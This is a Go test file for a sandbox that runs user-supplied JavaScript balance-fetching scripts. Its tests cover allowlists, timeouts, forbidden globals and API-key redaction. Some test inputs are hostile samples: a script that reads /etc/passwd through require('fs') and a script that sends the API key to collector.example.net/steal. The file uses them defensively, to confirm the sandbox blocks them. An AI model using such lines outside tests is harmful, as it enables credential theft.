package provider

import (
	"context"
	"errors"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"
)

func newJSTestRegistry(t *testing.T, opts Options) *Registry {
	t.Helper()
	if opts.Timeout == 0 {
		opts.Timeout = 5 * time.Second
	}
	if opts.ScriptTimeout == 0 {
		opts.ScriptTimeout = 5 * time.Second
	}
	return NewRegistry(opts)
}

func fetchScript(t *testing.T, registry *Registry, cfg Config) ([]Balance, error) {
	t.Helper()
	cfg.Kind = KindJS
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	return registry.Fetch(ctx, cfg)
}

const staticScript = `
function fetchBalance(ctx) {
  return [{ currency: "USD", total: 42, granted: 1, topped_up: 41, available: true }];
}`

func TestJSHappyPath(t *testing.T) {
	registry := newJSTestRegistry(t, Options{})
	balances, err := fetchScript(t, registry, Config{ProviderID: "js-test", Script: staticScript})
	if err != nil {
		t.Fatal(err)
	}
	if len(balances) != 1 || balances[0].Total != 42 || balances[0].Currency != "USD" {
		t.Fatalf("unexpected balances: %+v", balances)
	}
}

func TestJSValidate(t *testing.T) {
	registry := newJSTestRegistry(t, Options{})
	check, err := registry.ValidateScript(staticScript)
	if err != nil {
		t.Fatal(err)
	}
	if !check.Compiled || check.Hash == "" || len(check.Functions) != 1 {
		t.Fatalf("unexpected check: %+v", check)
	}

	if _, err := registry.ValidateScript(`function nothing() {}`); err == nil {
		t.Fatal("expected a missing fetchBalance to be rejected")
	}
	if _, err := registry.ValidateScript(`function fetchBalance( {`); err == nil {
		t.Fatal("expected a syntax error to be rejected")
	}
	if _, err := registry.ValidateScript(strings.Repeat("//", maxScriptBytes)); err == nil {
		t.Fatal("expected an oversized script to be rejected")
	}
}

// TestJSForbiddenGlobals asserts the sandbox exposes no ambient capability.
func TestJSForbiddenGlobals(t *testing.T) {
	registry := newJSTestRegistry(t, Options{})
	for _, name := range []string{
		"require", "module", "exports", "process", "fetch", "console",
		"XMLHttpRequest", "WebSocket", "setTimeout", "setInterval", "Buffer",
	} {
		script := `function fetchBalance(ctx) {
			if (typeof ` + name + ` !== "undefined") { throw new Error("` + name + ` is reachable"); }
			return [{ total: 1 }];
		}`
		balances, err := fetchScript(t, registry, Config{ProviderID: "x", Script: script})
		if err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		if len(balances) != 1 {
			t.Fatalf("%s: unexpected balances %+v", name, balances)
		}
	}
}

func TestJSForbiddenGlobalThrows(t *testing.T) {
	registry := newJSTestRegistry(t, Options{})
	script := `function fetchBalance(ctx) { return require("fs").readFileSync("/etc/passwd"); }`
	if _, err := fetchScript(t, registry, Config{ProviderID: "x", Script: script}); err == nil {
		t.Fatal("expected require() to fail")
	}
}

// TestJSTimeout proves a runaway loop is interrupted rather than hanging the
// process.
func TestJSTimeout(t *testing.T) {
	registry := newJSTestRegistry(t, Options{Timeout: 200 * time.Millisecond, ScriptTimeout: 200 * time.Millisecond})
	started := time.Now()
	_, err := fetchScript(t, registry, Config{
		ProviderID: "x",
		Script:     `function fetchBalance(ctx) { while (true) {} }`,
	})
	elapsed := time.Since(started)
	if err == nil {
		t.Fatal("expected a timeout")
	}
	if !strings.Contains(err.Error(), "timed out") {
		t.Fatalf("unexpected error: %v", err)
	}
	if elapsed > 3*time.Second {
		t.Fatalf("interrupt took too long: %s", elapsed)
	}
}

func TestJSRecursionIsBounded(t *testing.T) {
	registry := newJSTestRegistry(t, Options{MaxCallStackSize: 256})
	_, err := fetchScript(t, registry, Config{
		ProviderID: "x",
		Script:     `function f(n) { return f(n + 1); } function fetchBalance(ctx) { return f(0); }`,
	})
	if err == nil {
		t.Fatal("expected deep recursion to fail")
	}
}

func TestJSHTTPAndAllowlist(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") != "Bearer sk-js" {
			w.WriteHeader(http.StatusUnauthorized)
			return
		}
		_, _ = w.Write([]byte(`{"balance": {"amount": 7, "code": "EUR"}}`))
	}))
	defer server.Close()

	registry := newJSTestRegistry(t, Options{HTTPClient: server.Client()})
	script := `
function fetchBalance(ctx) {
  var res = ctx.http.get(ctx.baseUrl + "/balance", {
    headers: { Authorization: "Bearer " + ctx.apiKey }
  });
  if (res.status === 401) { throw new Error("rejected"); }
  ctx.log("status " + res.status);
  return [{ currency: res.json.balance.code, total: res.json.balance.amount }];
}`
	balances, err := fetchScript(t, registry, Config{
		ProviderID: "js-http", BaseURL: server.URL, APIKey: "sk-js",
		AllowHosts: []string{"127.0.0.1"}, Script: script,
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(balances) != 1 || balances[0].Total != 7 || balances[0].Currency != "EUR" {
		t.Fatalf("unexpected balances: %+v", balances)
	}
}

func TestJSBlocksNonAllowlistedHost(t *testing.T) {
	hit := false
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hit = true
	}))
	defer server.Close()

	registry := newJSTestRegistry(t, Options{HTTPClient: server.Client()})
	script := `function fetchBalance(ctx) {
	  ctx.http.get("https://collector.example.net/steal?key=" + ctx.apiKey);
	  return [{ total: 1 }];
	}`
	_, err := fetchScript(t, registry, Config{
		ProviderID: "js-egress", BaseURL: server.URL, APIKey: "sk-secret",
		AllowHosts: []string{"127.0.0.1"}, Script: script,
	})
	if err == nil {
		t.Fatal("expected the non-allowlisted host to be refused")
	}
	if hit {
		t.Fatal("the request reached the test server")
	}
}

func TestJSOutputValidation(t *testing.T) {
	cases := []struct {
		name   string
		script string
	}{
		{"not an array", `function fetchBalance(ctx) { return { total: 1 }; }`},
		{"missing total", `function fetchBalance(ctx) { return [{ currency: "USD" }]; }`},
		{"non-finite total", `function fetchBalance(ctx) { return [{ total: NaN }]; }`},
		{"string total", `function fetchBalance(ctx) { return [{ total: "12" }]; }`},
		{"null", `function fetchBalance(ctx) { return null; }`},
		{"too many", `function fetchBalance(ctx) {
			var items = []; for (var i = 0; i < 40; i++) { items.push({ total: i }); } return items;
		}`},
	}
	for _, item := range cases {
		registry := newJSTestRegistry(t, Options{})
		if _, err := fetchScript(t, registry, Config{ProviderID: "x", Script: item.script}); err == nil {
			t.Fatalf("%s: expected an error", item.name)
		}
	}

	registry := newJSTestRegistry(t, Options{})
	balances, err := fetchScript(t, registry, Config{
		ProviderID: "x", Currency: "CNY",
		Script: `function fetchBalance(ctx) { return [{ total: 0 }]; }`,
	})
	if err != nil {
		t.Fatal(err)
	}
	if balances[0].Currency != "CNY" {
		t.Fatalf("fallback currency not applied: %+v", balances[0])
	}
}

func TestJSRedactsAPIKeyInErrors(t *testing.T) {
	registry := newJSTestRegistry(t, Options{})
	_, err := fetchScript(t, registry, Config{
		ProviderID: "x", APIKey: "sk-super-secret",
		Script: `function fetchBalance(ctx) { throw new Error("bad key " + ctx.apiKey); }`,
	})
	if err == nil {
		t.Fatal("expected an error")
	}
	if strings.Contains(err.Error(), "sk-super-secret") {
		t.Fatalf("API key leaked: %v", err)
	}
}

func TestJSLogIsCapped(t *testing.T) {
	registry := newJSTestRegistry(t, Options{})
	registry.Register(loggedStub{kind: "logged"})
	_, _ = registry.Fetch(context.Background(), Config{ProviderID: "x", Kind: "logged"})
	// The log buffer lives in FetchEnv; exercise the cap directly.
	env := &FetchEnv{ctx: context.Background()}
	for i := 0; i < 1000; i++ {
		env.Log(strings.Repeat("x", 100))
	}
	if len(env.Logs()) > 8<<10 {
		t.Fatalf("log buffer exceeded its cap: %d bytes", len(env.Logs()))
	}
}

type loggedStub struct{ kind string }

func (s loggedStub) Kind() string          { return s.kind }
func (s loggedStub) SupportsBalance() bool { return true }
func (s loggedStub) Fetch(context.Context, Config, *FetchEnv) ([]Balance, error) {
	return nil, ErrNoBalanceAPI
}

func TestJSSettingsAndContext(t *testing.T) {
	registry := newJSTestRegistry(t, Options{})
	script := `function fetchBalance(ctx) {
	  if (ctx.providerId !== "abc") { throw new Error("providerId"); }
	  if (ctx.currency !== "JPY") { throw new Error("currency"); }
	  if (ctx.settings.region !== "jp") { throw new Error("settings"); }
	  if (typeof ctx.now() !== "string") { throw new Error("now"); }
	  return [{ total: 1 }];
	}`
	balances, err := fetchScript(t, registry, Config{
		ProviderID: "abc", Currency: "JPY", Settings: map[string]any{"region": "jp"},
		Script: script,
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(balances) != 1 || balances[0].Currency != "JPY" {
		t.Fatalf("unexpected balances: %+v", balances)
	}
}

func TestJSDisabled(t *testing.T) {
	registry := NewRegistry(Options{DisableJS: true})
	_, err := fetchScript(t, registry, Config{ProviderID: "x", Script: staticScript})
	if !errors.Is(err, ErrUnknownKind) {
		t.Fatalf("err = %v, want ErrUnknownKind", err)
	}
}
